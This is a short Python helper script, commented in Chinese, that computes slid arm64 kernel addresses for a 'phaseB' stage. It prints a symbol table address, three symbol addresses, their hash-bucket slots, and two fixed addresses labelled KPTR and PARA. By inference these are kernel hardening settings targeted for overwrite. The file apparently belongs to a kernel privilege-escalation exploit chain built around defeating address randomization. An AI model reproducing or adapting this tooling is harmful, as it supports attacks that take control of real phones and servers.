#!/usr/bin/env python3
"""按 slide 生成 phaseB 需要的全部地址（主机侧，毫秒级）

用法: python3 targets.py <slide_hex>   >  targets.txt
"""
import sys

TBL = 0xffffffc00a47d938
LM  = 0xffffffc008186f50
KO  = 0xffffffc0081bb474
SY  = 0xffffffc00815058c
KPTR_L = 0xffffffc00a20d4b8
PARA_L = 0xffffffc00a1fb3bc
GOLDEN = 0x61C8864680B583EB
M = (1 << 64) - 1

def bucket(addr):
    return ((addr * GOLDEN) & M) >> 58 & 63

def main():
    slide = int(sys.argv[1], 16)
    print("SLIDE=%#x" % slide)
    print("TABLE=%#x" % (TBL + slide))
    for name, link in (("TKO", KO), ("TSY", SY), ("TLM", LM)):
        print("%s=%#x" % (name, link + slide))
    for name, h, link in (("HKO", bucket(KO + slide), KO),
                          ("HSY", bucket(SY + slide), SY),
                          ("HLM", bucket(LM + slide), LM)):
        print("%s=%#x" % (name, TBL + slide + h * 8))
    print("KPTR=%#x" % KPTR_L)
    print("PARA=%#x" % PARA_L)

if __name__ == "__main__":
    main()
